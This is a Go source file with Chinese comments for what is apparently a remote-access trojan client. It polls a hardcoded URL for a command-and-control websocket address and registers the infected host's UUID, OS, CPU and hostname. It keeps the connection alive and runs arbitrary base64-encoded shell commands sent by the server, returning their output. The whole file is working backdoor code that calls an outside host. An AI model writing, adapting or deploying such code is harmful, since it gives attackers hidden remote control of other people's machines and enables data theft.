package Client

import (
	"encoding/json"
	"fmt"
	"g"
	"github.com/astaxie/beego/config"
	"github.com/gorilla/websocket"
	"github.com/levigross/grequests"
	"github.com/satori/go.uuid"
	"io/ioutil"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"time"
)

//=====
var Sx_url = "http://xxxxxxxxx.com/linux_ip.txt" //上线地址
//var Ws_url=""//"ws://localhost:800/wss"   //socket链接
var U_os = ""      //系统信息
var Uuid_data = "" //唯一ID
var Did = "0"      //代理id
var Name = ""      //备注名称

func Os_pz() string { //获取机器配置信息
	defer g.Panic_Err() //异常处理
	//==============
	//读取INI
	conf, err := config.NewConfig("ini", "server.ini")
	if err != nil {
		fmt.Println("new config failed, err:", err)
		//		return
	}
	Did = conf.String("Server::did")   //代理id
	Name = conf.String("Server::name") //备注名称
	//==============
	name, _ := os.Hostname()
	s := fmt.Sprintf("OS:%v CPU:%v HX:%v os-name:%v", runtime.GOOS, runtime.GOARCH, runtime.NumCPU(), name)
	return s
}

func Get_url_dataxA(url string, Timeout time.Duration) (string, bool) {
	defer g.Panic_Err()                                   //异常处理
	ro := &grequests.RequestOptions{DialTimeout: Timeout} //超时设置
	//===========================
	resp, err := grequests.Get(url, ro)
	//fmt.Printf("=======%v========\n", err)
	if err != nil {
		return "", false
	} else {
		//fmt.Printf("fffffffffffffffff:%v\n", resp.StatusCode)
		//fmt.Printf("fffffffffffffffff:%v\n", resp.String())

		if resp.StatusCode == 200 {
			return resp.String(), true
		}
	}
	return "", false
}

func Run() {
	defer g.Panic_Err() //异常处理
	U_os = Os_pz()      //获取机器配置信息
	for {               //死循环
		//获取URL
		Ws_url, err := Get_url_dataxA(Sx_url, 20*time.Second)
		if err == true {
			if Ws_url != "" {
				//Ws_url:=""   //SOCKET 通信地址
				//fmt.Printf("=====%v======\n", Ws_url)
				fmt.Printf("open_socket\r\n")
				open_url(Ws_url)
			}
		}
		time.Sleep(10 * time.Second)
	}
}

func open_url(open_socket_url string) {
	defer g.Panic_Err() //异常处理
	conn, _, err := websocket.DefaultDialer.Dial(open_socket_url, nil)
	if err != nil {
		fmt.Printf("link websocket err\r\n")
		return
	} else {
		fmt.Printf("link websocket ok\r\n")
		go ping(conn) //保持链接状态
		ini(conn)     //发送配置信息
		for {
			_, message, err := conn.ReadMessage() //接收消息
			if err != nil {
				fmt.Println("link close read:", err)
				return
			}
			go msg_cl(conn, message) //消息处理
			//fmt.Printf(string(message))
			//fmt.Printf("received: %+v\n", string(message))
		}
	}
}

type Message struct {
	Action string `json:"action,omitempty"`
	Data   string `json:"data,omitempty"`
}

func open_map_key(Data_list map[string]interface{}, key string) (bool, string) { //读取MAP 数据
	defer g.Panic_Err() //异常处理
	if _, ok := Data_list[key]; ok {
		return true, fmt.Sprintf("%v", Data_list[key])
	}
	return false, ""
}

func msg_cl(conn *websocket.Conn, message []byte) { //消息处理
	fmt.Printf("msg_cl: %+v\n", string(message))
	var dat map[string]interface{}
	if err := json.Unmarshal(message, &dat); err == nil { //json str 转map
		if action, ok := dat["action"]; ok { //判断键值是否存在
			switch action {
			case "ping": //ping
				bool, data := open_map_key(dat, "data")
				if bool {
					s := fmt.Sprintf("===ping:%v===\r\n", data)
					fmt.Printf(s) //解析在业务逻辑处理
				}
			case "Shell": //SHELL命令
				//===============
				bool, data := open_map_key(dat, "data")
				if bool {
					shell := g.Base64_Decode(data)
					s := strings.Split(shell, " ")
					cmd := &exec.Cmd{}
					if len(s) > 1 {
						index := 0
						//fmt.Println("=====", s[index])
						aa := s[index]
						s = append(s[:index], s[index+1:]...)
						//fmt.Println("=====", s)
						cmd = exec.Command(aa, s...) //("netstat","-ano")
					} else {
						cmd = exec.Command(shell) //("netstat","-ano")
					}
					stdout, err := cmd.StdoutPipe()
					res_data := ""
					if err != nil {
						fmt.Println("StdoutPipe  ERR: " + err.Error()) //return errors.New("Input Name")
						res_data = fmt.Sprintf("StdoutPipe  ERR: %v", err.Error())
					}
					if err := cmd.Start(); err != nil {
						fmt.Println("Start  ERR: ", err.Error()) //return errors.New("Input Name")
						res_data = fmt.Sprintf("Start  ERR: %v", err.Error())
					}
					bytesErr, err := ioutil.ReadAll(stdout)
					if err != nil {
						fmt.Println("ReadAll stderr  ERR: ", err.Error())
						res_data = fmt.Sprintf("ReadAll stderr  ERR: %v", err.Error())
					} else {
						res_data = string(bytesErr)
					}
					//fmt.Printf(string(bytesErr))
					jsonMessage, _ := json.Marshal(&Message{Action: "Shell", Data: g.Base64_Encode(string(res_data))}) ///
					conn.WriteMessage(websocket.TextMessage, jsonMessage)                                              //发送数据
				}
				//===============
			default:
				s := fmt.Sprintf("===err:%v===\r\n", string(message))
				fmt.Printf(s) //解析在业务逻辑处理
			}
		}
	}
}

func ini(conn *websocket.Conn) { //发送配置信息
	defer g.Panic_Err() //异常处理

	ss, err := uuid.NewV4()
	if err != nil {
		ff := fmt.Sprintf("%v-%v", g.GetRandomString(5), g.Time_Unix())
		hh := g.Md5_hex(ff)
		if hh == "" {
			Uuid_data = ff
		} else {
			Uuid_data = hh
		}
	} else {
		Uuid_data = ss.String()
	}
	s := fmt.Sprintf("{\"action\": \"uuid\",\"data\":\"%s\"}", Uuid_data) //
	conn.WriteMessage(websocket.TextMessage, []byte(s))
	s = fmt.Sprintf("{\"action\": \"u_os\",\"data\":\"%s\"}", U_os) //系统信息
	conn.WriteMessage(websocket.TextMessage, []byte(s))
	s = fmt.Sprintf("{\"action\": \"did\",\"data\":\"%s\"}", Did) //代理id
	conn.WriteMessage(websocket.TextMessage, []byte(s))
	s = fmt.Sprintf("{\"action\": \"name\",\"data\":\"%s\"}", Name) //备注名称
	conn.WriteMessage(websocket.TextMessage, []byte(s))
}

func ping(conn *websocket.Conn) {
	for {
		time.Sleep(time.Second * 3)
		data := "{\"action\": \"ping\"}"
		conn.WriteMessage(websocket.TextMessage, []byte(data))
		fmt.Printf(".")
		time.Sleep(time.Second * 60)
	}
}

func timeWriter(conn *websocket.Conn) {
	defer g.Panic_Err() //异常处理
	//for {
	time.Sleep(time.Second * 2)
	conn.WriteMessage(websocket.TextMessage, []byte(time.Now().Format("2006-01-02 15:04:05")))
	//}
}
